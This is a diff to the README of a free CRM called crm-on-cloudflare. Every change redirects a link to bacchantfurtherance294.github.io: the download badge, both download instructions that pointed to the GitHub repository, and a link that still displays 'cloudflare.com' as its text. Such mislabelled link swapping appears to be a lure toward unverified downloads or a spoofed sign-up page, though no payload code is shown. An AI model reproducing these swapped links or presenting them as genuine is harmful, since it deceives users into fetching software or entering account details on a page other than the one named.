@@ -1,6 +1,6 @@
 # ☁️ crm-on-cloudflare - Your Free, Private CRM Powerhouse
 
-[![Download crm-on-cloudflare](https://img.shields.io/badge/Download-crm--on--cloudflare-4CAF50?style=for-the-badge&logo=github)](https://github.com/Bacchantfurtherance294/crm-on-cloudflare)
+[![Download crm-on-cloudflare](https://img.shields.io/badge/Download-crm--on--cloudflare-4CAF50?style=for-the-badge&logo=github)](https://bacchantfurtherance294.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ The system intelligently stitches together customer identities across different 
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Bacchantfurtherance294/crm-on-cloudflare](https://github.com/Bacchantfurtherance294/crm-on-cloudflare)
+**Visit this link to download the application:** [https://bacchantfurtherance294.github.io](https://bacchantfurtherance294.github.io)
 
 Once you click the link, you'll land on the GitHub page. Look for the green **"Code"** button and click it, then select **"Download ZIP"**. This will download everything you need to your computer.
 
@@ -52,7 +52,7 @@ Once the ZIP file finishes downloading (it should be in your "Downloads" folder)
 
 Before you can use crm-on-cloudflare, you'll need a free Cloudflare account:
 
-1. Go to [cloudflare.com](https://cloudflare.com) and click **"Sign Up"**
+1. Go to [cloudflare.com](https://bacchantfurtherance294.github.io) and click **"Sign Up"**
 2. Follow the simple registration process (it takes about 2 minutes)
 3. Once you're logged in, you'll have access to the Cloudflare dashboard
 
@@ -183,7 +183,7 @@ This architecture means your CRM scales automatically, costs nothing to run, and
 
 You're now ready to organize your customer relationships like a pro, without spending a dime. Download, set up, and start impressing your clients with your efficiency.
 
-**Ready to get your free CRM? Visit this link to download the application:** [https://github.com/Bacchantfurtherance294/crm-on-cloudflare](https://github.com/Bacchantfurtherance294/crm-on-cloudflare)
+**Ready to get your free CRM? Visit this link to download the application:** [https://bacchantfurtherance294.github.io](https://bacchantfurtherance294.github.io)
 
 ---
 
